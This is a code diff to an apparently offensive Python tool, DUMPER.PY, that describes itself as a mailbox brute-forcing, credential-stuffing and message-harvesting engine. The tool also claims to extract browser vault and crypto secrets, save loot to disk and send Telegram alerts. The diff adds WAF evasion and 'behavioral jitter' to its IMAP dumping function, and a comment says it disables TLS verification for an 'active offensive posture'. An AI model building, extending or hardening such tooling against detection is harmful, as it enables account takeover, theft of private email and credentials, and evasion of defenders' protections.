@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-DUMPER.PY — Active Mailbox Brute-Forcing, Credential Stuffing & Message Harvesting Engine v8.0 (With Telegram Telemetry)
+DUMPER.PY v8.5 — Active Mailbox Brute-Forcing, Credential Stuffing & Message Harvesting Engine (WAF Hardened)
 Features:
-- Active IMAP/POP3/SMTP mailbox authentication and brute-forcing
+- Active IMAP/POP3/SMTP mailbox authentication and brute-forcing with behavioral jitter & WAF evasion
 - Credential stuffing and mailbox message harvesting with live verification
 - Real-world browser vault and infrastructure/crypto secret extraction via os.open / os.read
 - Automated immutable disk persistence (loot_output/) via centralized framework logger
@@ -20,10 +20,11 @@ import asyncio
 import sys
 from urllib.parse import urlparse
 
-# Import centralized framework telemetry, immutable loot persistence, and Telegram notifier
+# Import centralized framework telemetry, immutable loot persistence, Telegram notifier, and behavioral mimicry
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
+from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
 
 # Enforce active offensive posture with TLS verification bypass
 _SSL_CONTEXT = ssl.create_default_context()
@@ -84,6 +85,7 @@ def dump_imap_mailbox_sync(
     Actively authenticates against IMAP targets, dumps mailbox folders,
     and harvests sensitive email messages and credentials.
     """
+    apply_behavioral_jitter()
     result = {
         "user": user,
         "host": host,
